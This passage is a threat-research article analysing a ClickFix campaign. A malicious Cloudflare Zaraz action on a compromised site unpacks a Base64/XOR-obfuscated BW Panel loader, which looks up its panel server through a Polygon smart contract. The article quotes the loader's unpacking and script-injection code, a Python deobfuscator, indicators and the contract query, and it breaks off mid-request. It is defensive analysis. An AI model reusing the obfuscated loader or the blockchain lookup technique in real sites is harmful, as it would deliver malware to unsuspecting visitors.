---
title: ClickFix via Cloudflare Zaraz and the BW Panel
url: https://www.derp.ca/research/zaraz-clickfix-bw-panel/
source: Over Security
date: 2026-08-28
fetch_date: 2026-08-29T08:32:44.886612
---

# ClickFix via Cloudflare Zaraz and the BW Panel

[Skip to content](#main-content)

[![](/mascot/derp-beaver-sm.webp) Derp.ca](/)    [Home](/)  [Malware C2](/malware/)  [Distribution](/distribution/)  [Ransomware](/ransomware/)  [ClickFix](/clickfix/)  [PhaaS](/phaas/)  [npm](/npm/)  [Research](/research/)  [About](/about/)

[Home](/)  [Malware C2](/malware/)  [Distribution](/distribution/)  [Ransomware](/ransomware/)  [ClickFix](/clickfix/)  [PhaaS](/phaas/)  [npm](/npm/)  [Research](/research/)  [About](/about/)

1. [Home](/)
2. /
3. [Research](/research/)
4. /
5. ClickFix via Cloudflare Zaraz and the BW Panel

# ClickFix via Cloudflare Zaraz and the BW Panel

Kirk • August 26, 2026 • 8 min read

malwareclickfixcloudflarezarazetherhidingpolygonerrtraffic

On this page

* [Attack flow](#attack-flow)
* [Phase 1: Cloudflare Zaraz delivery](#phase-1-cloudflare-zaraz-delivery)
* [Observed inline bootstrap excerpt](#observed-inline-bootstrap-excerpt)
* [Phase 2: Payload unpacking and obfuscation](#phase-2-payload-unpacking-and-obfuscation)
* [Phase 3: EtherHiding through Polygon](#phase-3-etherhiding-through-polygon)
* [Why use EtherHiding?](#why-use-etherhiding)
* [What does `0xb68d1809` mean?](#what-does-0xb68d1809-mean)
* [Phase 4: BW Panel requests and encryption](#phase-4-bw-panel-requests-and-encryption)
* [Phase 5: ClickFix presentation modules](#phase-5-clickfix-presentation-modules)
* [Inside the `cloudflare` module](#inside-the-cloudflare-module)
* [Technical indicators](#technical-indicators)

A malicious JavaScript action served through Cloudflare Zaraz on `edgeupstudio[.]com` loaded a BW Panel bootstrap used by ErrTraffic ClickFix campaigns.

The Zaraz code handles loading and module selection. The chosen module draws the fake verification screen.

![Internal portal showing threat activity confirmed for the Zaraz-delivered BW specimen](/images/research/edgeupstudio-zaraz-bw-panel/portal-confirmation.png)

*Figure 1. Internal portal confirmation for the Zaraz-delivered BW specimen. The portal detected the returned `/cdn-cgi/zaraz/s.js` response and tagged it as the BW Panel Zaraz XOR-6 Pageview wrapper.*

---

## Attack flow

The chain has five parts:

1. A malicious Pageview action reaches the browser through the site's Cloudflare Zaraz endpoint.
2. Base64 decoding and a single-byte XOR operation reveal the BW loader.
3. The loader asks a Polygon contract for the current panel address.
4. The loader encrypts its request and contacts `/api/index.php` on that server.
5. The panel returns one of nine scripts, including fake browser, CAPTCHA, and Cloudflare prompts.

![Five-phase attack chain from Cloudflare Zaraz delivery through ClickFix delivery paths](/images/research/edgeupstudio-zaraz-bw-panel/attack-chain.png)

*Figure 2. The recovered attack chain from Cloudflare Zaraz delivery through the BW Panel and its ClickFix presentation paths.*

## Phase 1: Cloudflare Zaraz delivery

Cloudflare Zaraz is a legitimate tag-management platform that runs scripts from Cloudflare's edge. On the compromised site, its inline bootstrap gathered page state and loaded the first-party endpoint `/cdn-cgi/zaraz/s.js?z=<encoded page context>`.

The response contained a malicious Pageview action. Because the browser requested it from `edgeupstudio[.]com`, the first step looked like a normal first-party site resource rather than a script loaded from an unrelated domain. The `/cdn-cgi/zaraz/s.js` path itself is a normal part of Cloudflare Zaraz.

In April 2026, [YHL found the same loader in a malicious Cloudflare Worker (opens in new tab)](https://www.y-dev.tech/posts/cloudflare-account-hacked/) that proxied origin responses and appended an encrypted script. The decoded payload used `site_repair_state`, `bw-downloaded`, `__BW_MODE_RUN__`, the same nine file names, and selector `0xb68d1809`. It pointed at a different Polygon contract, marking it as a separate deployment of the kit.

### Observed inline bootstrap excerpt

```
window.zaraz._p = async nK => new Promise(nL => {
    if (nK) {
        nK.e && nK.e.forEach(nM => {
            const nP = d.createElement("script");
            nP.innerHTML = nM;
            d.head.appendChild(nP);
        });
    }
    nL();
});

lX.src = "/cdn-cgi/zaraz/s.js?z=" +
    btoa(encodeURIComponent(JSON.stringify(lP[lR])));
```

## Phase 2: Payload unpacking and obfuscation

The returned Zaraz response contained an inline obfuscated payload. Its unpacking routine decodes Base64, applies a single-byte XOR with key `0x06`, decodes the result as UTF-8, and executes it through `new Function()`.

This wrapper keeps the loader's decoded strings from appearing directly in the response body and prevents straightforward matching against its readable text. The XOR is easy to reverse once the key is known.

```
(function() {
    var _0xb0c5b4 = 6;
    var _0xaaa71f = "<base64 payload>";

    function _0xe89dd1(s, k) {
        s = atob(s);
        var len = s.length, i, arr = new Uint8Array(len);
        for (i = 0; i < len; i++) {
            arr[i] = s.charCodeAt(i) ^ k;
        }
        return new TextDecoder("utf-8").decode(arr);
    }
    var decoded = _0xe89dd1(_0xaaa71f, _0xb0c5b4);
    (new Function(decoded))();
})();
```

The same operation in Python:

```
import base64

def deobfuscate_zaraz_action(encoded_payload: str, key: int = 0x06) -> str:
    raw_bytes = base64.b64decode(encoded_payload)
    unmasked = bytearray(b ^ key for b in raw_bytes)
    return unmasked.decode("utf-8", errors="ignore")
```

## Phase 3: EtherHiding through Polygon

After unpacking, the loader needs the address of its panel server. It does not contain that domain directly. Instead, it sends a read-only JSON-RPC `eth_call` request to a smart contract on Polygon and decodes the server address returned by the contract.

| Property | Value |
| --- | --- |
| Network | Polygon mainnet |
| Contract | `0x224579e572cEEc5309A7d9F5fAf85dea5dBb7D4A` |
| Function selector | `0xb68d1809` |
| JSON-RPC method | `eth_call` |

### Why use EtherHiding?

The contract acts as a public lookup record. Its code and transaction history remain on the blockchain, but the stored panel address can change. Every copy of the loader keeps calling the same contract and picks up the replacement address automatically.

The panel domain is still visible when the browser connects to it and can be blocked. Putting the address in the contract lets the operator replace it with one update instead of changing the loader on every compromised site.

The lookup also runs through shared Polygon RPC services. Blocking every one of those services would interfere with legitimate applications that use the same infrastructure.

The loader can query QuickNode, Ankr, Nodies, BlastAPI, 1RPC, DRPC, Tenderly, Tatum, SubQuery, TheRPC, Lava, PublicNode, and HyperSync.

### What does `0xb68d1809` mean?

Ethereum-compatible contracts use a four-byte function selector to decide which function a request wants to call. The selector is the first four bytes of the Keccak-256 hash of the function's signature. In this loader, `0xb68d1809` asks the contract for the current panel address.

Calling this selector "non-standard" only means it belongs to this custom contract rather than a widely used contract interface. Its exact value is repeated across BW Panel deployments, which makes it useful as a family fingerprint.

[BlueTeamCoolTeam mapped four operators using the BW Panel kit (opens in new tab)](https://blueteam.cool/posts/etherhiding-ecosystem-mapped/) with this selector, the same `site_repair_state` storage key, the same `__BW_MODE_RUN__` function, and the same nine-file lookup table. Its July 2026 revalidation counted 348 unique compromised sites across those operators.

Edgeupstudio's loader uses the same selector, storage keys, runner name, and file map.

Representative JSON-RPC request:

```
{
  "jsonrpc": "2.0",
  "method": "eth_call",
  "params": [
    {
      "to": "0x224579e572cEEc5309A7d9F5fAf85dea5dBb7D4A",
      "data": "0xb68d1809"
    },
    "latest"...